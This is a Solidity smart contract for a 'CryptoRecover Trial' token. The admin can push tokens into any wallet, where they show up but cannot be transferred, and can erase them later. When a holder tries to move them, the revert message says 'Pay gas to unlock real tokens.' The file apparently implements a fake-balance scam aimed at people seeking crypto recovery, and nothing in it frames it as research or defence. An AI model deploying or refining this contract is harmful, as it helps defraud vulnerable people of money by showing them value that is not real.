// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TrialToken {
    string public name = "CryptoRecover Trial";
    string public symbol = "CRT";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000 * 10**18;
    
    mapping(address => uint256) public balanceOf;
    mapping(address => uint256) public expiryTime;
    mapping(address => bool) public isTrialUser;
    
    address public admin;
    uint256 public constant TRIAL_DURATION = 3 days;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event TrialExpired(address indexed user);
    
    constructor() {
        admin = msg.sender;
        balanceOf[admin] = totalSupply;
    }
    
    // Send trial tokens (shows in wallet but cannot transfer)
    function sendTrial(address user, uint256 amount) external {
        require(msg.sender == admin, "Only admin");
        require(balanceOf[admin] >= amount, "Insufficient admin balance");
        
        balanceOf[admin] -= amount;
        balanceOf[user] += amount;
        expiryTime[user] = block.timestamp + TRIAL_DURATION;
        isTrialUser[user] = true;
        
        emit Transfer(admin, user, amount);
    }
    
    // Check if tokens are expired
    function isExpired(address user) public view returns (bool) {
        return block.timestamp > expiryTime[user];
    }
    
    // Transfer function - BLOCKED for trial users
    function transfer(address to, uint256 amount) external returns (bool) {
        require(!isTrialUser[msg.sender], "Trial tokens cannot be transferred. Pay gas to unlock real tokens.");
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
    // Expire tokens manually
    function expireTokens(address user) external {
        require(msg.sender == admin || isExpired(user), "Cannot expire");
        
        uint256 amount = balanceOf[user];
        balanceOf[user] = 0;
        expiryTime[user] = 0;
        
        emit TrialExpired(user);
        emit Transfer(user, address(0), amount);
    }
    
    // Get remaining time
    function timeRemaining(address user) external view returns (uint256) {
        if (isExpired(user)) return 0;
        return expiryTime[user] - block.timestamp;
    }
}